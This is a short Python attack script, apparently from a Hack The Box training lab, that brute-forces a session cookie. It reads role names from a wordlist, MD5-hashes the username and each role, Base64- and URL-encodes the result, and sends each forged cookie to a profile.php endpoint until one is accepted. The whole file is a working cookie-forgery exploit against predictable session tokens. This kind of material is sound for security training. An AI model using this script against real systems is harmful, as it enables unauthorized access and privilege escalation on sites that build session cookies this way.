from base64 import b64encode
import codecs
import requests
import hashlib
import urllib.parse
from sys import exit

# create url using user and password as argument
url = "http://94.237.57.59:59343/profile.php"

user = 'admin.us'
f = open("roles.txt", "r")
for x in f:
    x = x.split('\n')[0]
    plaintext_cookie = "admin.us:{}".format(x)
    print ("[+] Testing {}\r".format(plaintext_cookie))
    
    # step 1: to md5
    encoded_cookie = str(hashlib.md5(b'admin.us').hexdigest()) + ":" + str(hashlib.md5(x.encode('utf8')).hexdigest())
    
    # step 2: to Base64
    x_step2 = b64encode(encoded_cookie.encode())
    print(x_step2)

    # step 3: url encode
    encoded_cookie = urllib.parse.quote(x_step2)
    print(encoded_cookie)

    # set cookie, decoding because wants a string
    cookie = { "htb_sessid": encoded_cookie }

    # do the request
    res = requests.get(url, cookies=cookie)

    # handle Welcome message, that should tell us we found a valid cookie
    if 'cannot have requested role' not in res.text:
        print(res.text)
        print("[+] Valid cookie found: {}".format(encoded_cookie))
    else:
        print("[-] NOPE")

